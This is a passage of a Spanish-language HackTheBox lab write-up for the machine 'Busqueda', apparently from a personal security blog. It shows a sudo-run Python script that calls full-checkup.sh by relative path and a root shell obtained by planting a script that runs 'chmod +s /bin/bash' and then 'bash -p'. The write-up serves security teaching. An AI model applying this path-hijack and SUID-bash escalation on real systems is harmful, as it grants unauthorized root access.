+<p>Una vez iniciados sesion en gitea y navegando un poco, encontre el script que estabamos ejecutando:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/bash
+</span><span class="kn">import</span> <span class="n">subprocess</span>
+<span class="kn">import</span> <span class="n">sys</span>
+
+<span class="n">actions</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">full-checkup</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">docker-ps</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">docker-inspect</span><span class="sh">'</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">run_command</span><span class="p">(</span><span class="n">arg_list</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">arg_list</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">stderr</span><span class="p">:</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">stderr</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span>
+
+    <span class="k">return</span> <span class="n">output</span>
+
+
+<span class="k">def</span> <span class="nf">process_action</span><span class="p">(</span><span class="n">action</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">action</span> <span class="o">==</span> <span class="sh">'</span><span class="s">docker-inspect</span><span class="sh">'</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">_format</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">_format</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Format can</span><span class="sh">'</span><span class="s">t be empty</span><span class="sh">"</span><span class="p">)</span>
+                <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+            <span class="n">container</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+            <span class="n">arg_list</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">docker</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">inspect</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--format</span><span class="sh">'</span><span class="p">,</span> <span class="n">_format</span><span class="p">,</span> <span class="n">container</span><span class="p">]</span>
+            <span class="nf">print</span><span class="p">(</span><span class="nf">run_command</span><span class="p">(</span><span class="n">arg_list</span><span class="p">))</span> 
+        
+        <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> docker-inspect &lt;format&gt; &lt;container_name&gt;</span><span class="sh">"</span><span class="p">)</span>
+            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    
+        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Something went wrong</span><span class="sh">'</span><span class="p">)</span>
+            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    
+    <span class="k">elif</span> <span class="n">action</span> <span class="o">==</span> <span class="sh">'</span><span class="s">docker-ps</span><span class="sh">'</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">arg_list</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">docker</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ps</span><span class="sh">'</span><span class="p">]</span>
+            <span class="nf">print</span><span class="p">(</span><span class="nf">run_command</span><span class="p">(</span><span class="n">arg_list</span><span class="p">))</span> 
+        
+        <span class="k">except</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Something went wrong</span><span class="sh">'</span><span class="p">)</span>
+            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">elif</span> <span class="n">action</span> <span class="o">==</span> <span class="sh">'</span><span class="s">full-checkup</span><span class="sh">'</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">arg_list</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">./full-checkup.sh</span><span class="sh">'</span><span class="p">]</span>
+            <span class="nf">print</span><span class="p">(</span><span class="nf">run_command</span><span class="p">(</span><span class="n">arg_list</span><span class="p">))</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Done!</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Something went wrong</span><span class="sh">'</span><span class="p">)</span>
+            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+            
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">action</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">if</span> <span class="n">action</span> <span class="ow">in</span> <span class="n">actions</span><span class="p">:</span>
+            <span class="nf">process_action</span><span class="p">(</span><span class="n">action</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="nb">IndexError</span>
+
+    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;action&gt; (arg1) (arg2)</span><span class="sh">'</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">''</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">     docker-ps     : List running docker containers</span><span class="sh">'</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">     docker-inspect : Inpect a certain docker container</span><span class="sh">'</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">     full-checkup  : Run a full system checkup</span><span class="sh">'</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">''</span><span class="p">)</span>
+        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Donde vi vemos la opcion de <code class="language-plaintext highlighter-rouge">full-checkup</code> esta ejecutando un archivo sh:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">elif</span> <span class="n">action</span> <span class="o">==</span> <span class="sh">'</span><span class="s">full-checkup</span><span class="sh">'</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">arg_list</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">./full-checkup.sh</span><span class="sh">'</span><span class="p">]</span>
+            <span class="nf">print</span><span class="p">(</span><span class="nf">run_command</span><span class="p">(</span><span class="n">arg_list</span><span class="p">))</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Done!</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Something went wrong</span><span class="sh">'</span><span class="p">)</span>
+            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Donde el script <code class="language-plaintext highlighter-rouge">full-checkup.sh</code> no se le indica la ruta, es decir, se ejecuta desde el directorio donde este el usuario, asi que… ¿Por que no crearlo?, me ire al directorio /tmp y dentro del script, le asignare permisos SUID a /bin/bash:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
+chmod +s /bin/bash
+</code></pre></div></div>
+
+<p>Ahora solo ponemos: <code class="language-plaintext highlighter-rouge">bash -p</code> y ya somos root</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.1# whoami
+root
+bash-5.1# cat /root/root.txt 
+f46884c23c53cc716ac549803*******
+</code></pre></div></div>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+
+<p><img src="/assets/img/busqueda/waifu.gif" alt=""></p>
+
+
+    </div>
+    
+    
+</article>
+<div class="post-nav">
+<a class="previous" href="/hackthebox/2023/04/05/htb-squashed.html" title="HackTheBox Squashed - NFS y X11">HackTheBox Squashed - NFS y X11...</a><a class="next" href="/explotacion%20binaria/2023/04/15/htb-entity.html" title="HackTheBoo Entity - Type Confusion via Union">HackTheBoo Entity - Type Confusion via...</a>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/explotacion%20binaria/2023/01/21/protostar-heap2.html" title="HackTheBoo Entity - Type Confusion via Union">protostar heap2 - UAF (Use-After-Free)</a></li>
+<li><a class="post-link" href="/explotacion%20binaria/2022/08/03/leak-stack-canary.html" title="HackTheBoo Entity - Type Confusion via Union">Leak stack canary - bypass</a></li>
+<li><a class="post-link" href="/explotacion%20binaria/2023/04/24/rop-emporium-callme.html" title="HackTheBoo Entity - Type Confusion via Union">ROP emporium callme - Llamando multiples funciones</a></li>
+<li><a class="post-link" href="/explotacion%20binaria/2023/01/06/TAMU-2019-pwn1.html" title="HackTheBoo Entity - Type Confusion via Union">TAMU 2019 pwn1 - BufferOverflow</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+  
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+  
+  
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --></section>
+</div>
+
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div align="center" class="wrapper">
+    <div class="site-footer-inner">
+<div class="footer-col rss-subscribe">
+	  <font size="1" color="gray">
+	  <!--RSS SVG-->
+   	<svg aria-hidden="true" fill="#ff4e00" height="12" width="12" viewbox="0 0 16 16" version="1.1" data-view-component="true" class="octicon octicon-rss mr-1">
+    <path fill-rule="evenodd" d="M2.002 2.725a.75.75 0 01.797-.699C8.79 2.42 13.58 7.21 13.974 13.201a.75.75 0 11-1.497.098 10.502 10.502 0 00-9.776-9.776.75.75 0 01-.7-.798zM2 13a1 1 0 112 0 1 1 0 01-2 0zm.84-5.95a.75.75 0 00-.179 1.489c2.509.3 4.5 2.291 4.8 4.8a.75.75 0 101.49-.178A7.003 7.003 0 002.838 7.05z"></path>
+    </svg>
+	  <a href="/feed.xml" target="_blank"> RSS </a>订阅 |  
+    <!--提供支持-->
+    由 <a title="Jekyll is a simple, blog-aware, static site
+    generator." href="http://jekyllrb.com/" target="_blank">Jekyll</a> &amp; <a title="Yat, yet
+    another theme." href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">Yat Theme</a>提供支持
+	  </font>
+</div>
+
+    <!--版权-->
+    <div>
+    <font size="1" color="gray">
+    Copyright © 2017-2023 <a href="https://github.com/ic4rta/">c4rta</a> All Rights Reserved
+    </font>
+</div>
+
+      <!--logo
+  <div>
+
+    <a href="https://github.com/vanhiupun" target="_blank">
+      <img src="https://visitor-badge.glitch.me/badge?page_id=vanhiupun.visitor-badge&right_color=Orange" alt="visitor" />
+    </a> 
+	    
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml" target="_blank">
+        <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml/badge.svg" />
+    </a>
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml" target="_blank">
+      <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml/badge.svg">
+    </a> 
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io" target="_blank">
+      <img src="https://www.codefactor.io/repository/github/vanhiupun/vanhiupun.github.io/badge" alt="CodeFactor" />
+    </a>
+    
+    <a href="https://codeclimate.com/github/vanhiupun/Vanhiupun.github.io/maintainability">
+      <img src="https://api.codeclimate.com/v1/badges/708da11ffb90a8f6f13b/maintainability" alt="maintainability" />
+    </a>
+    
+    <a href="https://rubygems.org/gems/jekyll-theme-yat" target="_blank">
+        <img src="https://badge.fury.io/rb/jekyll-theme-yat.svg"     alt="jekyll-theme-yat" />
+    </a> 
+    
+    <a href="https://github.com/vanhiupun" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Repository-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Github" />
+    </a> 
+          
+    <a href="https://vanhiupun.github.io" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Page-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Blog" />
+    </a> 
+          
+    <a href="mailto:fanxiaobin422@gmail.com" target="_blank">
+        <img src="https://img.shields.io/badge/Send%20me%20Gmail-EA4335?style=flat-square&logo=Gmail&logoColor=ffffff" alt="Gmail" />
+    </a> 
+          
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/blob/c0c037532393ee2718892f87b200a0bbe33e7eb9/License" target="_blank">
+        <img src="https://img.shields.io/badge/License%20MIT-f2cb05?style=flat-square&logo=Mitsubishi&logoColor=222222" alt="MIT" />
+    </a>
+          
+    <a href="http://jekyllthemes.org/" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%20Themes-f2cb05?style=flat-square&logo=Jekyll&logoColor=222222" alt="jekyll-themes" />
+    </a> 
+    
+    <a href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%C2%B7Theme%C2%B7Yat-f2cb05?style=flat-square&logo=github&logoColor=181717" alt="Jekyll-yat" />
+    </a> 
+      
+    <a href="https://raw.githubusercontent.com/vanhiupun/Vanhiupun.github.io/master/assets/images/img/zz.png" target="_blank">
+        <img src="https://img.shields.io/badge/GitHub%20Sponsors-EA4335?style=flat-square&logo=GitHub%20Sponsors&logoColor=222222" alt="/GitHub%20Sponsors" />
+    </a> 
+  </div>-->
+  </div>
+  </div>
+</footer>
+</body>
+</html><html>
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+</html>
